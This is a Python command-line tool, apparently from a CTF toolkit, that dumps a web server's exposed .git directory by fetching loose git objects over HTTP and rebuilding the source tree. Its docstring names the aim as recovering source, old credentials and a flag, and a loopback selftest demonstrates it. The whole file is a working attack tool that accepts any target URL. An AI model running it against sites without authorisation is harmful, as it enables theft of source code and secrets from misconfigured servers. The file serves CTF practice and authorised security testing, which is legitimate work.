#!/usr/bin/env python3
"""Recover a served .git directory through plain HTTP object fetches.

`git clone --no-checkout` fails when the server does not speak the smart
protocol and directory listing is off — but loose objects live at fixed
paths: `.git/objects/<aa>/<38-hex>`. Given a readable `.git/HEAD` this
tool resolves the ref, walks commit -> tree -> blob, inflates each loose
object, and writes the working tree out. That is the CTF shape: source +
old credentials + the flag, without git or any external tool.

Pack-only repositories are reported honestly: no pack index parser.

  python3 tools/web/git_dumper.py --base https://t/.git/ --out repo
  python3 tools/web/git_dumper.py --selftest
"""
import argparse, json, os, re, sys, zlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Thread

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                os.pardir))
import httpkit

_MAX_OBJ = 20_000
_MAX_BYTES = 64 << 20
_OBJ_RE = re.compile(rb"^(commit|tree|blob|tag) (\d+)\x00")
_SHA_RE = re.compile(rb"^[0-9a-f]{40}$")


def fetch(base, path, budget):
    if budget["n"] >= budget["max"]:
        return None
    budget["n"] += 1
    r = httpkit.request(base + path, timeout=budget.get("timeout", 15))
    if not r["ok"] or r["status"] != 200 or not r["body_bytes"]:
        return None
    return r["body_bytes"]


def inflate(raw):
    try:
        d = zlib.decompress(raw)
    except zlib.error:
        return None, None
    m = _OBJ_RE.match(d)
    if not m:
        return None, None
    typ = m.group(1).decode()
    return typ, d[m.end():]


def obj_path(sha):
    return "objects/%s/%s" % (sha[:2], sha[2:])


def parse_commit(data):
    m = re.search(rb"^tree ([0-9a-f]{40})", data, re.M)
    parents = re.findall(rb"^parent ([0-9a-f]{40})", data, re.M)
    return (m.group(1).decode() if m else None,
            [p.decode() for p in parents])


def parse_tree(data):
    """git tree object: repeated <mode> <name>\x00<20-byte sha>."""
    out, i = [], 0
    while i < len(data):
        sp = data.find(b" ", i)
        if sp < 0:
            break
        mode = data[i:sp].decode("ascii", "replace")
        nul = data.find(b"\x00", sp)
        if nul < 0 or nul + 21 > len(data):
            break
        name = data[sp + 1:nul].decode("utf-8", "replace")
        sha = data[nul + 1:nul + 21].hex()
        out.append((mode, name, sha))
        i = nul + 21
    return out


def resolve_head(base, budget):
    head = fetch(base, "HEAD", budget)
    if not head:
        return None, "no readable .git/HEAD"
    head = head.strip()
    m = re.match(rb"ref:\s*(\S+)", head)
    if m:
        ref = m.group(1).decode()
        body = fetch(base, ref, budget)
        if body and _SHA_RE.match(body.strip()):
            return body.strip().decode(), ref
        # packed-refs fallback
        packed = fetch(base, "packed-refs", budget)
        if packed:
            for line in packed.splitlines():
                if line.startswith(b"#") or line.startswith(b"^"):
                    continue
                parts = line.split()
                if len(parts) == 2 and parts[1].decode() == ref:
                    return parts[0].decode(), ref
        return None, "ref %s advertised but not fetchable" % ref
    if _SHA_RE.match(head):
        return head.decode(), "detached"
    return None, "unrecognised HEAD content"


def dump(base, outdir, budget):
    sha, ref = resolve_head(base, budget)
    if not sha:
        return None, ref  # ref carries the error string
    commits, written, seen = 0, 0, set()
    queue = [("commit", sha, "")]
    pack_hint = False
    while queue and len(seen) < _MAX_OBJ and budget["n"] < budget["max"]:
        kind, sha_, path = queue.pop(0)
        if sha_ in seen:
            continue
        seen.add(sha_)
        raw = fetch(base, obj_path(sha_), budget)
        if raw is None:
            if kind == "commit":
                pack_hint = True
            continue
        typ, data = inflate(raw)
        if kind == "commit" and typ == "commit":
            commits += 1
            tree, parents = parse_commit(data)
            if tree:
                queue.append(("tree", tree, ""))
            queue.extend(("commit", p, "") for p in parents)
        elif kind == "tree" and typ == "tree":
            for mode, name, esha in parse_tree(data):
                p = os.path.join(path, name) if path else name
                if mode == "40000":
                    queue.append(("tree", esha, p))
                elif mode == "160000":
                    continue  # submodule — no objects to fetch
                else:
                    queue.append(("blob", esha, p))
        elif kind == "blob" and typ == "blob":
            rel = os.path.normpath(path).lstrip(os.sep + ".")
            if ".." in rel.split(os.sep) or len(data) > _MAX_BYTES:
                continue
            dest = os.path.join(outdir, rel)
            os.makedirs(os.path.dirname(dest) or outdir, exist_ok=True)
            with open(dest, "wb") as f:
                f.write(data)
            written += 1
    return {
        "ref": ref, "tip": sha, "objects_seen": len(seen),
        "commits_walked": commits, "files_written": written,
        "requests_used": budget["n"],
        "pack_only_hint": pack_hint and commits == 0,
        "out": os.path.abspath(outdir),
    }, None


def _selftest() -> int:
    """Serve a fake .git over loopback and recover a file."""
    def obj(typ, data):
        return zlib.compress(typ.encode() + b" " + str(len(data)).encode()
                             + b"\x00" + data)

    blob_sha = "aa" * 20
    tree_sha = "bb" * 20
    commit_sha = "cc" * 20
    tree = b"100644 flag.txt\x00" + bytes.fromhex(blob_sha)
    commit = b"tree %s\nauthor x <x@y> 1 +0000\n\ninit\n" % tree_sha.encode()
    files = {
        "HEAD": b"ref: refs/heads/main\n",
        "refs/heads/main": (commit_sha + "\n").encode(),
        obj_path(commit_sha): obj("commit", commit),
        obj_path(tree_sha): obj("tree", tree),
        obj_path(blob_sha): obj("blob", b"flag{g1t_dump3d}\n"),
    }

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            key = self.path.lstrip("/")
            if key in files:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(files[key])
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, *a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    Thread(target=srv.serve_forever, daemon=True).start()
    try:
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            res, err = dump("http://127.0.0.1:%d/" % srv.server_port,
                            td, {"n": 0, "max": 500})
            assert err is None, err
            assert res["commits_walked"] == 1, res
            p = os.path.join(td, "flag.txt")
            assert open(p, "rb").read() == b"flag{g1t_dump3d}\n"
    finally:
        srv.shutdown()
    print("git_dumper selftest: ok")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--base", help="URL of the .git directory, trailing /")
    ap.add_argument("--out", default="git-dump")
    ap.add_argument("--max-requests", type=int, default=4000)
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not a.base:
        ap.error("--base is required")
    base = a.base if a.base.endswith("/") else a.base + "/"
    res, err = dump(base, a.out, {"n": 0, "max": a.max_requests})
    if err:
        print(json.dumps({"error": err, "base": base}))
        return 1
    print(json.dumps(res, indent=1))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
